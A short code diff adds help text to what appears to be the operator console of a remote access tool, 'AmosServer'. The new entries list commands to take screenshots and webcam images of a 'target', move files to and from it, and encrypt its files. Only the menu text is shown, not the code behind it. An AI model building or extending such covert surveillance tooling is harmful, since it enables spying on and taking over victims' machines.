@@ -289,6 +289,15 @@ class AmosServer:
           show fields <client_id> - List all field names for client
           fields <client_id> <field> - Show value of a specific field
           exit                   - Shutdown Amos server
+          
+        Shell Commands:
+            screenshot                  - Capture the target's screen
+            camshot                     - Capture an image from the target's webcam
+            getfile <path>              - Download a file from the target
+            sendfile <path>             - Upload a file to the target
+            encrypt <file> <password>   - Encrypt a file on the target
+            decrypt <file> <password>   - Decrypt a file on the target
+            exit                        - Return to the main server menu
         """
         print(help_text)
 
